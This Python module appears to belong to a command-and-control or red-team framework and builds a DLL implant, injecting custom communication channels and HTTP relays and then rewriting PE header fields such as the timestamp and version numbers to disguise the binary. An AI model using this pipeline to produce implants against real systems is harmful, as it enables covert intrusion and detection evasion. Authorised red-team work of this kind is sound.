from ...blocking_io import read_build_b64, run_in_thread
from ..utils.paths import project, cleanup
from ..utils.prep import (
    replace as replace_placeholders,
    cleanup as cleanup_build,
    inject_preface,
    inject_custom_channel,
    inject_custom_http_relay,
)
from ..utils.pe import (
    create_pe_strings,
    timestamp,
    major_linker_version,
    minor_linker_version,
    major_os_version,
    minor_os_version,
    major_image_version,
    minor_image_version,
    major_subsystem_version,
    minor_subsystem_version,
)
from ..utils.build import dll as compile_main
from ..utils.migrate import migrate


async def main(body, tag):
    # Builds a dll implant
    config = body["config"]

    src = None
    try:
        src = await project(body)
        await run_in_thread(cleanup_build, src)
        await inject_custom_channel(config, src)
        await inject_custom_http_relay(config, src)
        build_tag = await replace_placeholders(
            src, config, tag, body.get("implant_base", "stageless")
        )

        if config.get("create_pe_strings"):
            await create_pe_strings(config, src)

        if config.get("preface"):
            await inject_preface(config, src)

        # COMPILE ===============================================================

        build = await compile_main(config, tag, body)
        if build.get("status") == "failure":
            return build

        #######################
        #   POST PROCESSING   #
        #######################

        built_dll = build["path"]

        # NT HEADERS ============================================================

        if config.get("pe_timestamp"):
            built_dll = await timestamp(config, tag, built_dll)
        if config.get("pe_major_linker_version") is not None:
            built_dll = await major_linker_version(config, tag, built_dll)
        if config.get("pe_minor_linker_version") is not None:
            built_dll = await minor_linker_version(config, tag, built_dll)
        if config.get("pe_major_os_version") is not None:
            built_dll = await major_os_version(config, tag, built_dll)
        if config.get("pe_minor_os_version") is not None:
            built_dll = await minor_os_version(config, tag, built_dll)
        if config.get("pe_major_image_version") is not None:
            built_dll = await major_image_version(config, tag, built_dll)
        if config.get("pe_minor_image_version") is not None:
            built_dll = await minor_image_version(config, tag, built_dll)
        if config.get("pe_major_subsystem_version") is not None:
            built_dll = await major_subsystem_version(config, tag, built_dll)
        if config.get("pe_minor_subsystem_version") is not None:
            built_dll = await minor_subsystem_version(config, tag, built_dll)

        if build_tag:
            await migrate(build_tag, built_dll, config, tag, body)

        # FINAL OUTPUT ==========================================================

        dll = await read_build_b64(built_dll)

        return {
            "status": "success",
            "message": "Implant built successfully",
            "bytes": dll,
            "stdout": build["stdout"],
            "stderr": build["stderr"],
        }
    finally:
        await cleanup(tag)
        await run_in_thread(cleanup_build, src)
